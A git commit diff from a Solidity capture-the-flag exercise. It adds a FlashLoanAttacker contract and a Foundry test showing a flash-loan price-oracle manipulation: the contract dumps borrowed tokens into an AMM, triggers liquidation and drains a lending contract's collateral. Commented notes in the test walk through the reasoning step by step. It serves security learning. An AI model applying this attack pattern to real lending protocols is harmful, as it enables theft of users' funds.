a6592716b69f71c36fb25539fe48907933fcf71f
Chua, Shu Ern <shuernchua@kapps.com.sg>
2023-12-07 16:13:27 +0800

    Flash Loan CTF

--- FlashLoanCTF/src/FlashLoanAttacker.sol
+++ FlashLoanCTF/src/FlashLoanAttacker.sol
@@ -4,5 +4,85 @@ pragma solidity 0.8.21;
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import {console2} from "@forge-std/console2.sol";
+import "./AMM.sol";
+import "./FlashLoan.sol";
+import "./CollateralToken.sol";
 
-contract FlashLoanAttacker {}
+contract FlashLoanAttacker is IERC3156FlashBorrower {
+    using SafeERC20 for IERC20;
+
+    AMM public amm;
+    FlashLender public flashLender;
+    CollateralToken public tokenContract;
+    Lending public lending;
+    address public borrower;
+    uint256 public counter;
+    uint256 public tokenAmount;
+
+    constructor(AMM _amm, FlashLender _flashLender, CollateralToken _token, address _borrower, Lending _lending) {
+        amm = _amm;
+        flashLender = _flashLender;
+        tokenContract = _token;
+        borrower = _borrower;
+        lending = _lending;
+    }
+
+    function attack() public {
+        IERC20(tokenContract).approve(address(flashLender), type(uint256).max);
+        withdrawAllTheTokens();
+        console2.log("balanceOfCollateralTokenNow in attacker:", IERC20(tokenContract).balanceOf(address(this)));
+    }
+
+    function withdrawAllTheTokens() public {
+        //Step 1, get Flash Loan, maybe by abusing the 0 fee integer division thing
+        console2.log("Step 1 get Flash Loan");
+        flashLender.flashLoan(IERC3156FlashBorrower(address(this)), address(tokenContract), 500 ether, "");
+    }
+
+    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
+        external
+        returns (bytes32)
+    {
+        console2.log("onFlashLoan entered");
+        // Step 2.1.0: Transfer Tokens to AMM (state is not updated yet)
+        SafeERC20.safeTransfer(IERC20(tokenContract), address(amm), 69 ether);
+        // Step 2.1.1: How many tokens to transfer? (let's try 100 ether first)
+
+        // Step 2.2.0: call swapTokensForEth, we give 100 ether for some amount of eth
+        uint256 prevEthBalance = address(this).balance;
+        uint256 ethAmountIn = amm.swapLendTokenForEth(address(this));
+        console2.log("Amount of Eth Received:", ethAmountIn);
+        // Step 3.1.0: Now that Price of Token has dropped, we call liquidate(borrower), that should will send
+        uint256 prevTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
+        console2.log("prevTokenBalanceOfAttacker:", prevTokenBalanceOfAttacker);
+        lending.liquidate(borrower);
+        uint256 currentTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
+        console2.log("currentTokenBalanceOfAttacker:", currentTokenBalanceOfAttacker);
+        // Step 4.1.0: Mission Accomplished right?, swap eth back for tokens.
+
+        (bool success,) = address(amm).call{value: address(this).balance}("");
+        require(success, "Failed to send ether to amm");
+        amm.swapEthForLendToken(address(this));
+        uint256 newTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
+        //Step 5.1.0: Repay the loan
+        console2.log("newTokenBalanceOfAttacker:", newTokenBalanceOfAttacker);
+        IERC20(tokenContract).approve(address(amm), type(uint256).max);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    receive() external payable {
+        console2.log("attacker received ether:", msg.value);
+    }
+}
+// Step 2.1.0: Transfer Tokens to AMM (state is not updated yet)
+// Step 2.1.1: How many tokens to transfer? (let's try 100 ether first)
+// Step 2.2.0: call swapTokensForEth, we give 100 ether for some amount of eth
+// Step 3.1.0: Now that Price of Token has dropped, we call liquidate(borrower), that should will send
+// tokens to attacking contract
+// Step 4.1.0: Mission Accomplished right?, swap eth back for tokens.
+// Step 5.1.0: Repay the loan
+//
--- FlashLoanCTF/test/FlashLoan.t.sol
+++ FlashLoanCTF/test/FlashLoan.t.sol
@@ -5,6 +5,7 @@ import {Test} from "@forge-std/Test.sol";
 
 import {DeployFlashloanScript} from "@script/DeployFlashloan.s.sol";
 import {FlashLoanAttacker} from "@main/FlashLoanAttacker.sol";
+import {console2} from "@forge-std/console2.sol";
 
 contract FlashloanTest is Test, DeployFlashloanScript {
     string mnemonic = "test test test test test test test test test test test junk";
@@ -47,24 +48,119 @@ contract FlashloanTest is Test, DeployFlashloanScript {
         lending.borrowEth(6 ether);
         vm.stopPrank();
         _;
+        // lender has 240e18
+        // how to make lender have 0
+
+        //CLUE: Something to do with flash loans
+        // What are the assumptions of the flash loan?
+        // The flash loan contract only inteacts with our attacker contract
+        // and the Token contract
+
+        // The AMM (oracle) contract has knowledge of the token Contract and also any other
+        // contract that wants to get token for eth
+        // It's job is to provide tokens/eth if you need it
+
+        // Lending contract
+
+        console2.log("address of lender's owner:", lending.lender()); // Deployer address
+            //who do I have access to?
+            // lender?
+            // at the end I need to call liquidate and receive to get tokens
+    }
+
+    // function test_borrowEthOutputs() public {
+    //     vm.startPrank(lender);
+    //     lending.borrowEth(10 ether);
+    // }
+    function test_trySomething() public beforeEach {
+        vm.startPrank(borrower);
+        lending.liquidate(borrower);
+        //   oracle.lendTokenReserve(): 400000000000000000000
+        //   oracle.ethReserve(): 20000000000000000000
+        //   loanInfo.collateralBalance: 240000000000000000000
+        //   collateralRequired: 180000000000000000000
+        //   difference needed: 60000000000000000000
+        //  uint256 lendQuote = (oracle.lendTokenReserve() * loanInfo.borrowedAmount) / oracle.ethReserve();
+
+        // uint256 collateralRequired = (lendQuote * liquidationThreshold) / collateralContext;
     }
 
     function test_isSolved() public beforeEach {
-        vm.startPrank(lender);
+        // print states
 
+        // Flash Loan Contract
+        console2.log("Beginning");
+        console2.log("~~~Flash Loan state~~~");
+        uint256 tokenBalanceOfFlashLoan = collateralToken.balanceOf(address(flashLoan));
+        uint256 ethBalanceOfFlashLoan = address(flashLoan).balance;
+        console2.log("Token Balance of Flash Loan:", tokenBalanceOfFlashLoan);
+        console2.log("Token Balance of Flash Loan:", ethBalanceOfFlashLoan);
+
+        console2.log("~~~AMM state~~~");
+        console2.log("Token Balance of AMM:", collateralToken.balanceOf(address(amm)));
+        console2.log("Ether Balance of AMM:", address(amm).balance);
+
+        console2.log("~~~Lending state~~~");
+        console2.log("Token Balance of Lending Contract:", collateralToken.balanceOf(address(lending)));
+        console2.log("Ether Balance of Lending Contract:", address(lending).balance);
+
+        console2.log("~~~Borrower~~~");
+        console2.log("token balance of borrower:", collateralToken.balanceOf(borrower)); //2.6e18
+        console2.log("eth balance of borrower:", address(borrower).balance); //6 ether
+
+        // console2.log("~~~Lender~~~");
+        // console2.log("Token Balance of Lender:", collateralToken.balanceOf(address(lending)));
+        // console2.log("Ether Balance of Lender:", address(lending).balance);
+
+        console2.log("Attack");
+
+        vm.startPrank(borrower);
+        // what is the eth balance of lending
+        // console2.log("eth balance of lending:", address(lending).balance); //0
+        // console2.log("token balance of lending:", collateralToken.balanceOf(address(lending))); //2.4e18
+        // console2.log("eth balance of borrower:", address(borrower).balance); //6 ether
+        // console2.log("token balance of borrower:", collateralToken.balanceOf(borrower)); //2.6e18
+        // (uint256 borrowerCollateralBalance, uint256 borrowerBorrowedAmount) = lending.userToLoanInfo(borrower);
+        // console2.log("borrowerCollateralBalance:", borrowerCollateralBalance); // 240000000000000000000  or 2.4e18
+        // console2.log("borrowerBorrowedAmount:", borrowerBorrowedAmount); //6000000000000000000 6 ether
+        // console2.log("tokenBalanceOfFlashLoan:", collateralToken.balanceOf(address(flashLoan))); // 500 ether
+
+        //The idea of this exercise that we can use flash loans to dramatically inflate/deflate a price a token
+        // given an AMM
+        // AMM contracts have functions that give us a price quote, which can change dramatically with the use of flash loans
+
+        // Step 1: Get Flash Loan (maybe by abusing the 9999 amount for 0 fee)
+        // Step 2: Using Flash Loan, dump it into AMM, making Tokens Abundant, and Eth scarce. Price of eth UP, price of token down
+        // Step 3: When that happens, whenever when we want to liquidate, the "collateralRequired" would increase
+        // Why? Because the numerator is token reserve (very high) and denominator is eth reserve, very low.
+        // High Numerator, Low Denominator, means high collateral required, passing the require statement (colalteralbalance< collateral required)
+        // this would make the Lending contract send our attacking contract "amount" of tokens
+
+        // Going deeper into Step 2:
+
+        // Step 2.1.0: Transfer Tokens to AMM (state is not updated yet)
+        // Step 2.1.1: How many tokens to transfer? (let's try 100 ether first)
+        // Step 2.2.0: call swapTokensForEth, we give 100 ether for some amount of eth
+        // Step 3.1.0: Now that Price of Token has dropped, we call liquidate(borrower), that should will send
+        // tokens to attacking contract
+        // Step 4.1.0: Mission Accomplished right?, swap eth back for tokens.
+        // Step 5.1.0: Repay the loan
+        //
         /**
          * Requirements:
          * - Liquidate and take all collateral from lending contract and send to lender wallet
          * - Do this in 2 transactions or less?
          */
 
-        // flashLoanAttacker = new FlashLoanAttacker(
-        //     payable(address(amm)),
-        //     payable(address(lending)),
-        //     payable(address(flashLoan)),
-        //     borrower
-        // );
-        // flashLoanAttacker.attack();
+        flashLoanAttacker = new FlashLoanAttacker(
+            amm,
+            flashLoan,
+            collateralToken,
+            borrower,
+            lending
+           
+        );
+        flashLoanAttacker.attack();
 
         assertEq(collateralToken.balanceOf(address(lending)), 0 ether, "must fully drain lending contract");
 
